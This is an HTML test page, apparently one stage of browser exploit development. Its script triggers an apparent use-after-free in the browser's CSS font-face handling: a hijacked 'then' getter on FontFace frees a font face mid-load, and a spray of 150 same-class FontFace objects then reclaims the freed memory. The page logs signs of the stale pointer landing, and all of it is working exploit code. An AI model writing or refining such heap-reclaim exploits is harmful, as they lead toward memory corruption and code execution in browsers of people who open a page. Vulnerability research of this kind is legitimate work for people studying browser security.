<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>P2 v15</title>
<style>body{font-size:28px;font-family:sans-serif;background:#111;color:#0f0}pre{white-space:pre-wrap;font-size:22px}</style>
<style id="s0">@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }</style>
</head>
<body>
<h3 id="st">stage A</h3>
<pre id="out"></pre>
<script>
// Phase 2 v15: SAME-CLASS spray. Fresh FontFace objects allocate the exact
// CSSFontFace C++ class from the same allocator as the freed chunk. Oracle is
// behavioral: stale engine pointers landing on a controlled face show up as
// anomalous face statuses / the hung load resolving or corrupting.
function log(s) { document.getElementById('out').textContent += s + "\n"; }

log('PAGE VERSION: v15 (same-class FontFace spray)');
log('UA = ' + navigator.userAgent);

var NFS = 150, faces = [];

function faceSpray() {
  for (var i = 0; i < NFS; i++) {
    var f = new FontFace('z' + i, 'local(Helvetica)', {});
    document.fonts.add(f);            // allocates the backing CSSFontFace
    faces.push(f);
  }
}

function scanFaces(tag) {
  var bad = 0, loaded = 0, unloaded = 0, err = 0;
  try {
    for (var i = 0; i < NFS; i++) {
      var s = faces[i].status;
      if (s === 'loaded') loaded++;
      else if (s === 'unloaded') unloaded++;
      else if (s === 'error') err++;
      else { bad++; if (bad < 4) log('face ' + i + ' WEIRD status: ' + s); }
    }
  } catch (e) { log('scan threw: ' + e); }
  log('scan(' + tag + '): loaded=' + loaded + ' unloaded=' + unloaded +
      ' error=' + err + ' weird=' + bad + ' fonts.status=' + document.fonts.status);
  if (bad > 0) log('SAME-CLASS RECLAIM SIGNAL - anomalous face statuses');
}

function trigger() {
  log('stage B: trigger in 3s');
  setTimeout(function () {
    log('triggering + FontFace spray');

    var A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
    document.fonts.add(A);
    void A.loaded;

    var fired = 0;
    Object.defineProperty(FontFace.prototype, 'then', {
      configurable: true,
      get: function () {
        fired++;
        if (this === A && fired === 1) {
          log('GETTER FIRED - free + same-class spray');
          try { document.getElementById('s0').sheet.deleteRule(0); } catch (e) {}
          document.body.offsetTop;               // force recalc -> FREE
          faceSpray();                           // 150 fresh CSSFontFace-class objects
          document.body.offsetTop;               // recalc through the new faces
          document.fonts.check('1em x', 'A');
        }
        return undefined;
      }
    });

    try {
      document.fonts.load('1em x', 'AB').then(
        function (f) {
          log('load RESOLVED with ' + (f ? f.length : '?') + ' faces' +
              ' - stale pointer may have landed on a sprayed face');
          for (var i = 0; f && i < f.length; i++)
            log('  reported face: ' + (f[i] && f[i].family) +
                ' status=' + (f[i] && f[i].status));
        },
        function (e) { log('load rejected: ' + e); });
    } catch (e) { log('load threw: ' + e); }

    setTimeout(function () { scanFaces('2s'); }, 2000);
    setTimeout(function () { scanFaces('6s'); }, 6000);
  }, 3000);
}

log('armed');
window.onload = trigger;
</script>
</body>
</html>
